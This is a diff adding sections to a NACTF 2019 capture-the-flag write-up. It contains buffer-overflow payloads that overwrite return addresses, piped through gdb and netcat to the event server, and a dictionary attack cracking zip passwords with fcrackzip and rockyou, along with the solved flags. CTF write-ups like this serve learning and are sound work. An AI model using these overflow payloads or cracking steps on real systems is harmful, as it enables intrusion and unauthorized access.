@@ -206,6 +206,48 @@ flag: nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
 srimbp-223:sri$ 
 ``` 
 
+### bufferOverflow1
+```
+(gdb) run <<< $(python -c "print('A'28+'\xb2\x91\x04\x08')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/Downloads/bufferOverflow1/bufover-1 <<< $(python -c "print('A'28+'\xb2\x91\x04\x08')")
+
+Breakpoint 1, 0x08049290 in main ()
+(gdb) c
+Continuing.
+Type something>
+Breakpoint 2, 0x0804924c in vuln ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804925b in vuln ()
+(gdb) c
+Continuing.
+You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
+You win!
+flag.txt not found - ping us on discord if this is happening on the shell server
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7fe43b6 in ?? () from /lib/ld-linux.so.2
+(gdb)
+
+nc shell.2019.nactf.com 31184
+```
+
+### Buffer overflow 2
+( The ultimate time taker as gdb always ended up in error, executing it directly on server won. Null bytes confusion?)
+```
+root@kali:~/Downloads/bufferOverflow2# python -c "print('A'*28 + '\xc2\x91\x04\x08' + 'C'*4 + 'U\xda\xb4\x14' + '\x00\x00\x00\x00' + '\xbe\xb4\r\xf0')" | nc shell.2019.nactf.com 31184
+Type something>You typed AAAAAAAAAAAAAAAAAAAAAAAAAAACCCCUڴ!
+You win!
+flag: nactf{PwN_th3_4rG5_T0o_Ky3v7Ddg}
+
+root@kali:~/Downloads/bufferOverflow2# 
+
+```
+
 ## Web
 
 ### Pink Panther
@@ -298,3 +340,93 @@ function mouseClick() {
 }
 ```
 
+
+## Forensics
+
+### ZIP ME
+
+```
+root@kali:~/Downloads# fcrackzip -h
+
+fcrackzip version 1.0, a fast/free zip password cracker
+written by Marc Lehmann <pcg@goof.com> You can find more info on
+http://www.goof.com/pcg/marc/
+
+USAGE: fcrackzip
+          [-b|--brute-force]            use brute force algorithm
+          [-D|--dictionary]             use a dictionary
+          [-B|--benchmark]              execute a small benchmark
+          [-c|--charset characterset]   use characters from charset
+          [-h|--help]                   show this message
+          [--version]                   show the version of this program
+          [-V|--validate]               sanity-check the algortihm
+          [-v|--verbose]                be more verbose
+          [-p|--init-password string]   use string as initial password/file
+          [-l|--length min-max]         check password with length min to max
+          [-u|--use-unzip]              use unzip to weed out wrong passwords
+          [-m|--method num]             use method number "num" (see below)
+          [-2|--modulo r/m]             only calculcate 1/m of the password
+          file...                    the zipfiles to crack
+
+methods compiled in (* = default):
+
+ 0: cpmask
+ 1: zip1
+*2: zip2, USE_MULT_TAB
+
+root@kali:~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt zip1.zip 
+
+
+PASSWORD FOUND!!!!: pw == dictionary
+root@kali:~/Downloads# unzip zip1.zip 
+Archive:  zip1.zip
+[zip1.zip] zip1.rtf password: 
+  inflating: zip1.rtf                
+root@kali:~/Downloads# vi zip1.rtf 
+root@kali:~/Downloads# cat zip1.rtf | grep nactf
+\f0\fs24 \cf0 nactf\{w0w}
+root@kali:~/Downloads# cat zip1.rtf 
+{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 nactf\{w0vi zip1.rtf ^C
+root@kali:~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt zip2.zip 
+
+
+PASSWORD FOUND!!!!: pw == rock
+root@kali:~/Downloads# unzip zip2.zip 
+Archive:  zip2.zip
+[zip2.zip] zip2.rtf password: 
+  inflating: zip2.rtf                
+root@kali:~/Downloads# cat zip2.rtf 
+{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 _y0u_unz1pp}root@kali:~/Downloads# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt zip3.zip 
+
+
+PASSWORD FOUND!!!!: pw == dog
+root@kali:~/Downloads# unzip zip3.zip 
+Archive:  zip3.zip
+[zip3.zip] zip3.rtf password: 
+  inflating: zip3.rtf                
+root@kali:~/Downloads# cat zip3.rtf 
+{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 3d_m3\}}root@kali:~/Downloads# 
+
+```
+* Flag: nactf{w0w_y0u_unz1pp3d_m3}
